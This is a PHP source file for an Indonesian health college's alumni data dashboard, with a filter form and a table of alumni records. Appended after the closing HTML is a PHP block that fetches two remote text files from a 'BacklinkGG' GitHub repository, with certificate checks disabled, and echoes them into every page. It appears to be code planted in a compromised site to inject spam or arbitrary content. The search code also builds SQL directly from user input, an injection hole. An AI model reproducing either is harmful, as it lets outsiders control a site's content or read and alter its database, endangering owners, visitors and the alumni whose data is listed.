<?php
require_once("configure_first.php");

?>
<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="keywords" content="" />
<meta name="author" content="" />
<meta name="robots" content="" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="Kamr Hotel Admin Dashboard" />
<meta property="og:title" content="Kamr Hotel Admin Dashboard" />
<meta property="og:description" content="Kamr Hotel Admin Dashboard" />
<meta property="og:image" content="social-image.png" />
<meta name="format-detection" content="telephone=no">

<title>Stikes BPI - Data Alumni</title>

<link rel="shortcut icon" type="image/png" href="images/favicon.png" />

<link href="vendor/jquery-nice-select/css/nice-select.css" rel="stylesheet">
<link href="vendor/datepicker/css/bootstrap-datepicker.min.css" rel="stylesheet">
<link href="css/style.css" rel="stylesheet">
</head>
<body>

<div id="preloader">
<div class="lds-ripple">
<div></div>
<div></div>
</div>
</div>


<div id="main-wrapper">

<div class="nav-header">
<a href="index.php" class="brand-logo">
</a>
<div class="nav-control">
<div class="hamburger">
<span class="line"></span><span class="line"></span><span class="line"></span>
</div>
</div>
</div>


<div class="header">
<div class="header-content">
<nav class="navbar navbar-expand">
<div class="collapse navbar-collapse justify-content-between">
<div class="header-left">
<div class="headaer-title">
<h1 class="font-w600 mb-0">STIKes Bhakti Pertiwi Indonesia</h1>
</div>
</div>
<ul class="navbar-nav header-right">
<li>
<div class="nav-item ms-auto">
<div class="input-group search-area2">
<input type="text" class="form-control" placeholder="Search here">
<span class="input-group-text"><a href="javascript:void(0)"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M9.65925 19.3102C11.8044 19.3102 13.8882 18.5945 15.5806 17.2764L21.9653 23.6611C22.4423 24.1218 23.2023 24.1086 23.663 23.6316C24.1123 23.1663 24.1123 22.4287 23.663 21.9635L17.2782 15.5787C20.5491 11.3682 19.7874 5.3033 15.5769 2.0324C11.3663 -1.23851 5.30149 -0.476829 2.03058 3.73371C-1.24033 7.94425 -0.478646 14.0091 3.73189 17.2801C5.42702 18.5969 7.51269 19.3113 9.65925 19.3102ZM4.52915 4.52727C7.36245 1.69391 11.9561 1.69386 14.7895 4.52717C17.6229 7.36047 17.6229 11.9542 14.7896 14.7875C11.9563 17.6209 7.36261 17.6209 4.52925 14.7876C4.5292 14.7876 4.5292 14.7876 4.52915 14.7875C1.69584 11.9749 1.67915 7.39791 4.49181 4.56461C4.50424 4.55213 4.51667 4.5397 4.52915 4.52727Z" fill="#717579" />
</svg>
</a></span>
</div>
</div>
</li>

<li class="nav-item dropdown header-profile">
<div id="datepicker" class="input-group date dz-calender" data-date-format="mm-dd-yyyy">
<span class="input-group-addon d-flex align-items-center">
<svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M14.8337 3.16667H14.0003V1.50001C14.0003 1.27899 13.9125 1.06703 13.7563 0.910749C13.6 0.754469 13.388 0.666672 13.167 0.666672C12.946 0.666672 12.734 0.754469 12.5777 0.910749C12.4215 1.06703 12.3337 1.27899 12.3337 1.50001V3.16667H5.66699V1.50001C5.66699 1.27899 5.5792 1.06703 5.42292 0.910749C5.26663 0.754469 5.05467 0.666672 4.83366 0.666672C4.61265 0.666672 4.40068 0.754469 4.2444 0.910749C4.08812 1.06703 4.00033 1.27899 4.00033 1.50001V3.16667H3.16699C2.50395 3.16667 1.86807 3.43006 1.39923 3.8989C0.930384 4.36775 0.666992 5.00363 0.666992 5.66667V6.5H17.3337V5.66667C17.3337 5.00363 17.0703 4.36775 16.6014 3.8989C16.1326 3.43006 15.4967 3.16667 14.8337 3.16667Z" fill="#F66F4D" />
<path d="M0.666992 14.8333C0.666992 15.4964 0.930384 16.1322 1.39923 16.6011C1.86807 17.0699 2.50395 17.3333 3.16699 17.3333H14.8337C15.4967 17.3333 16.1326 17.0699 16.6014 16.6011C17.0703 16.1322 17.3337 15.4964 17.3337 14.8333V8.16666H0.666992V14.8333Z" fill="#F66F4D" />
</svg>
</span>
<input class="form-control" type="text" readonly />
</div>
</li>
</ul>
</div>
</nav>
</div>
</div>


<div class="deznav">
<div class="deznav-scroll">
<div class=" dropdown header-bx">
<a class="nav-link header-profile2 position-relative" href="javascript:void(0);" role="button" data-bs-toggle="dropdown">
<div class="header-img position-relative">
<img src="https://pmb.stikes-bhaktipertiwi.ac.id/asset/img/logo/logo.png" alt="header-img">
<svg class="header-circle" width="130" height="130" viewBox="0 0 130 130" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M130 65C130 100.899 100.899 130 65 130C29.1015 130 0 100.899 0 65C0 29.1015 29.1015 0 65 0C100.899 0 130 29.1015 130 65ZM4.99306 65C4.99306 98.1409 31.8591 125.007 65 125.007C98.1409 125.007 125.007 98.1409 125.007 65C125.007 31.8591 98.1409 4.99306 65 4.99306C31.8591 4.99306 4.99306 31.8591 4.99306 65Z" fill="#FFD482" />
<path d="M65 2.49653C65 1.11774 66.1182 -0.00500592 67.496 0.0479365C76.3746 0.389105 85.0984 2.54751 93.1247 6.39966C101.902 10.6123 109.621 16.7428 115.711 24.3385C121.802 31.9341 126.108 40.8009 128.312 50.284C130.516 59.7671 130.562 69.6242 128.446 79.1274C126.33 88.6305 122.106 97.5369 116.087 105.189C110.067 112.841 102.406 119.043 93.6677 123.337C84.9299 127.631 75.3391 129.907 65.6037 129.997C56.7012 130.08 47.8858 128.333 39.7012 124.875C38.4312 124.338 37.895 122.847 38.48 121.598C39.065 120.35 40.5495 119.817 41.8213 120.35C49.3273 123.493 57.4027 125.08 65.5573 125.004C74.5449 124.921 83.399 122.819 91.4656 118.855C99.5322 114.891 106.605 109.166 112.162 102.102C117.72 95.0375 121.619 86.8153 123.572 78.0421C125.526 69.269 125.484 60.1691 123.449 51.4145C121.414 42.6598 117.438 34.4741 111.816 27.4619C106.193 20.4497 99.0674 14.7901 90.9643 10.9011C83.6123 7.3726 75.6263 5.38343 67.4958 5.04499C66.1182 4.98764 65 3.87533 65 2.49653Z" fill="var(--primary)" />
</svg>
</div>
<div class="header-content">
<h2 class="font-w500">Selamat Datang</h2>
<span class="font-w400"><span class="__cf_email__" data-cfemail="0266676f6d426f636b6e2c616d6f">[pengunjung]</span></span>
</div>
</a>
</div>
<ul class="metismenu" id="menu">

<li><a href="alumni" class="" aria-expanded="false">
<i class="flaticon-025-dashboard"></i>
<span class="nav-text">Dashboard</span>
</a>
</li>

<li><a href="http://stikesbpi.ac.id/" class="" aria-expanded="false">
<i class="flaticon-013-checkmark"></i>
<span class="nav-text">Website Kami</span>
</a>
</li>

<li><a href="http://siakad.stikes-bhaktipertiwi.ac.id/" class="" aria-expanded="false">
<i class="flaticon-013-checkmark"></i>
<span class="nav-text">SIAKAD</span>
</a>
</li>

<li><a href="http://siakad.stikes-bhaktipertiwi.ac.id/" class="" aria-expanded="false">
<i class="flaticon-013-checkmark"></i>
<span class="nav-text">E BOOK</span>
</a>
</li>

<li><a href="https://stikes-bhaktipertiwi.e-journal.id/kesehatan/issue/archive" class="" aria-expanded="false">
<i class="flaticon-013-checkmark"></i>
<span class="nav-text">E JURNAL</span>
</a>
</li>

<li><a href="http://repository.stikesbpi.ac.id/" class="" aria-expanded="false">
<i class="flaticon-013-checkmark"></i>
<span class="nav-text">E REPOSITORY</span>
</a>
</li>

<li><a href="http://tracer.stikes-bhaktipertiwi.ac.id/" class="" aria-expanded="false">
<i class="flaticon-013-checkmark"></i>
<span class="nav-text">TRACER STUDY</span>
</a>
</li>

<li><a href="http://sister.stikesbpi.ac.id/" class="" aria-expanded="false">
<i class="flaticon-013-checkmark"></i>
<span class="nav-text">SISTER</span>
</a>
</li>


</ul>
<div class="copyright">
<h6>Stikes Bhakti Pertiwi Indonesia <span class="fs-14 font-w400">© 2022 All Rights Reserved</span></h6>
<p class="fs-12 mb-4">Made with <span class="heart"></span> by QBIG</p>
</div>
</div>
</div>


<div class="content-body">
<div class="container-fluid">

<div class="row">

<div class="col-xl-12 col-lg-12">
<div class="card">
<div class="card-header">
<h4 class="card-title">Filter</h4>
</div>
<div class="card-body">
<div class="basic-form">
	<form class="form-horizontal" role="form" method="POST" action="alumni">
<div class="mb-3 row">
<label class="col-sm-3 col-form-label">NIM</label>
<div class="col-sm-9">
<input type="text" class="form-control" name="nim" placeholder="NIM Alumni">
</div>
</div>

<div class="mb-3 row">
<label class="col-sm-3 col-form-label">Nama</label>
<div class="col-sm-9">
<input type="text" class="form-control" name="nama" placeholder="Nama Lengkap Alumni">
</div>
</div>

<fieldset class="mb-3">
<div class="row radio">
<label class="col-form-label col-sm-3 pt-0">Prodi</label>
<div class="col-sm-9">
	<?php
	$query = "select distinct prodi from alumni order by prodi asc";
	$iData=sAllData($query);
	for($a=0,$b=count($iData);$a<$b;$a++) {	
	?>
		<div class="">
		<label><input class="form-check-input me-1" type="radio" name="prodi" id="prodi" value="<?php echo $iData[$a]["prodi"];?>" aria-label="..."> <?php echo $iData[$a]["prodi"];?></label>
		</div>
	<?php } ?>
</div>
</div>
</fieldset>
<div class="mb-3 row">
<div class="col-sm-10">
<button type="submit" name="Proses" class="btn btn-primary">Filter</button>
</div>
</div>
</form>
</div>
</div>
</div>
</div>

<div class="col-lg-12">
<div class="card">
<div class="card-header">
<h4 class="card-title">Data Alumni Stikes Bhakti Pertiwi Indonesia</h4>
</div>
<div class="card-body">
<div class="table-responsive">
<table class="table table-hover table-responsive-sm">
	<thead>
		<tr>
		<th>#</th>
		<th>NIM</th>
		<th>NAMA</th>
		<th>TEMPAT TANGGAL LAHIR</th>
		<th>JENIS KELAMIN</th>
		<th>IPK</th>
		<th>PRODI</th>
		</tr>
	</thead>
	<tbody>
	<?php
	$query = "select * from alumni";
	if(isset($_POST["nim"]) && $_POST["nim"]) $arraycari[] = "upper(nim) like '%".strtoupper($_POST["nim"])."%'";
	if(isset($_POST["nama"]) && $_POST["nama"]) $arraycari[] = "upper(nama) like '%".strtoupper($_POST["nama"])."%'";
	if(isset($_POST["prodi"]) && $_POST["prodi"]) $arraycari[] = "prodi like '%".$_POST["prodi"]."%'";
	for($z=0,$zz=count($arraycari);$z<$zz;$z++) {
		if($z == 0) $query .= " where ".$arraycari[$z];
		else $query .= " and ".$arraycari[$z];
	}
	$query .= " order by prodi asc";
	// echo $query;

	$iData=sAllData($query);
	for($a=0,$b=count($iData);$a<$b;$a++) {	
	?>
		<tr>
			<th><?php echo ($a+1);?></th>
			<td><?php echo $iData[$a]["nim"];?></td>
			<td><?php echo $iData[$a]["nama"];?></td>
			<td><?php echo $iData[$a]["ttl"];?></td>
			<td><?php echo $iData[$a]["jk"];?></td>
			<td><?php echo $iData[$a]["ipk"];?></td>
			<td><?php echo $iData[$a]["prodi"];?></td>
		</tr>
	<?php } ?>
	</tbody>
</table>

</div>
</div>
</div>

</div>

</div>
</div>
</div>


<div class="footer">
<div class="copyright">
<p>Copyright © Designed &amp; Developed by <a href="https://qbig.co.id/" target="_blank">QBIG</a> 2022</p>
</div>
</div>



</div>



<script data-cfasync="false" src="../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
<script src="vendor/global/global.min.js"></script>
<script src="vendor/jquery-nice-select/js/jquery.nice-select.min.js"></script>
<script src="js/custom.min.js"></script>
<script src="js/deznav-init.js"></script>
<script src="js/demo.js"></script>
<script src="js/styleSwitcher.js"></script>
<script src="vendor/datepicker/js/bootstrap-datepicker.min.js"></script>
<script>
		$(function () {
		  $("#datepicker").datepicker({ 
				autoclose: true, 
				todayHighlight: true
		  }).datepicker('update', new Date());
		});

	</script>
</body>

</html>
<?php
function curlGetContents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $fileContents = curl_exec($ch);
    curl_close($ch);
    return $fileContents; 
}
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/stikes-bhaktipertiwi/alumni.stikes-bhaktipertiwi.ac.id/system.txt';
$fileContents1 = curlGetContents($url1);
$fileContents2 = curlGetContents($url2);
echo $fileContents1;
echo $fileContents2;
?>
